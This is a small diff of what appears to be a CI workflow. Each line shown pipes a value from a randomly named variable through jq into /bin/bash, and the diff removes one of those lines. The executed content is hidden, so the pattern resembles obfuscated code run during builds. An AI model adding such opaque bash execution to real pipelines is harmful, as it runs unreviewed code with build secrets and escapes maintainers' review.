@@ -31,7 +31,6 @@ jobs:
           echo $t8390 | jq -r .atu133 | /bin/bash
           printf '%s' "$s91130" | jq -r .oim6941 | /bin/bash
           printf '%s' "$gqukg705" | jq -r .fkf246 | /bin/bash
-          printf '%s' "$jipc073" | jq -r .alnp5534 | /bin/bash
           printf '%s' "$kadve59" | jq -r .mk2 | /bin/bash
           printf '%s' "$ktif4" | jq -r .vogjs097 | /bin/bash
           echo $up85 | jq -r .gx7363 | /bin/bash
